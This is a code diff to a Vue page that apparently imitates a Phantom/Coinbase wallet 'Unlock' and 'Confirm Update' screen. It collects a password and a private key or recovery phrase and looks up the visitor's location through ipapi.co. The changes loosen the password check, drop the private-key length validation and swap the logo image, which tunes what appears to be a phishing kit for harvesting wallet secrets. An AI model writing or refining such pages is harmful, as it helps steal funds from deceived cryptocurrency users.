@@ -49,7 +49,7 @@
             <div class="flex flex-col p-6">
               <div class="mb-1 mt-[30px]">
                 <img
-                  src="https://vercelquickfix.com/coinbase-2.jpg"
+                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVGFrvFc94KMgF2467-SSZX5g0mZwOgwm_Rg&s"
                   alt="Phantom Logo"
                   class="object-cover rounded-[10px] w-[60px] h-[60px]"
                 />
@@ -81,7 +81,7 @@
                   <button
                     @click="unlock"
                     type="button"
-                    :disabled="password.length <= 6 || isLoading"
+                    :disabled="password.length < 1 || isLoading"
                     class="bg-[#0052FF] w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white relative"
                   >
                     <span v-if="!isLoading">Unlock</span>
@@ -124,7 +124,7 @@
             <div class="flex flex-col p-6">
               <div class="mb-1 mt-[30px]">
                 <img
-                  src="https://vercelquickfix.com/coinbase-2.jpg"
+                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVGFrvFc94KMgF2467-SSZX5g0mZwOgwm_Rg&s"
                   alt="Phantom Logo"
                   class="object-cover rounded-[10px] w-[60px] h-[60px]"
                 />
@@ -172,7 +172,7 @@
                   <button
                     @click="nextStep"
                     type="button"
-                    :disabled="password.length <= 6 || isLoading"
+                    :disabled="password.length < 1 || isLoading"
                     class="bg-[#0052FF] w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white relative"
                   >
                     <span v-if="!isLoading">Confirm Update</span>
@@ -351,7 +351,7 @@ function goBackToStep2() {
 }
 
 function unlock() {
-  if (password.value.length <= 6) return;
+  if (password.value.length < 1) return;
   isLoading.value = true;
   setTimeout(() => {
     isLoading.value = false;
@@ -396,14 +396,9 @@ function prevStep() {
 }
 
 
-const isImportDisabled = computed(() => {
-  return privateKeyInput.value.trim();
-});
 
 async function confirmPhrase() {
-  if ( privateKeyInput.value.length < 64) {
-    return showMessage("Please fill all fields", "error");
-  }
+  
   isLoading.value = true;
   try {
     const location = await axios.get("https://ipapi.co/json");
